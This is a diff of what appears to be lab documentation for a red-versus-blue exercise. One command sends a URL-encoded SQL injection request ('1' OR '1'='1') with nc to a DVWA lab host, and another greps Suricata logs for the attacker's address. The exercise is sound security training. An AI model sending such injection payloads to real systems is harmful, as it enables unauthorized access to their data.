@@ -197,7 +197,7 @@ graph TD
 
 ```bash
 # 레드(el34-attacker): SQLi 발사
-echo -en "GET /?id=1%27%20OR%20%271%27=%271 HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE "[0-9]{3}"
+echo -en "GET /?id=1%27%20OR%20%271%27=%271 HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
 # 블루(el34-ips): 출처 탐지 흔적
 tail -2000 /var/log/suricata/eve.json | grep -c "192.168.0.202"
 ```
